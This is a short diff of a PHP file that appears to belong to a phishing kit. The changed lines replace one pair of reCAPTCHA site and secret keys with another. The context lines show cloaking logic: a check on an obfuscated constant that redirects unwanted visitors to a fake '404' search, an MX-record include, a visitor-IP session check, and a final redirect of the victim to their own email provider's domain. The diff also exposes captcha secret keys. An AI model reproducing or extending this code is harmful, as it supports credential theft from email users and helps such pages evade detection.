@@ -5,8 +5,8 @@ require_once('config.php');
 defined('2BgI5Youc1knSTVZb3VjMWtueVBZOXVETjkwNXkQ4VlMzZmNXNzFFRkx0VE0xQkwvLbk0yTUE9PTV51qt8VS3ZmNXNzFFRkx0VE0xQkw0') or exit(header(sprintf("Location:%s", 'http://www.google.com/search?q=404%20page')));
 require_once('netends.php');
 require_once('mxrec.php');
-$captcha_site_key = "6LeHyfErAAAAABtk3iWl6K_0l0BWwOmZMT8xDe2N";
-$captcha_secret_key = "6LeHyfErAAAAALoT-VNbjRgk_46H3jue-wfOKIrj";
+$captcha_site_key = "6LcbfA4sAAAAAMtZLtcuKT_WRc9X90vbJ4k00BWB";
+$captcha_secret_key = "6LcbfA4sAAAAAK-qe3-gK9wMYwxx-5S2N-wsofwa";
 
 if(isset($_POST['send']) && ($_SESSION['visitor_ip'] == show_visitor_ip())) {
     $url = 'https://www.google.com/recaptcha/api/siteverify?secret='.$captcha_secret_key.'&response='.$_POST['g-recaptcha-response'];
@@ -1195,3 +1195,4 @@ if(isset($_GET['tap']) && ($_GET['tap'] == $_SESSION['skii'])) {
 	session_destroy();
 	exit(header(sprintf("Location:%s", 'http://'.getDomain($_SESSION['myemail']))));
 }
+
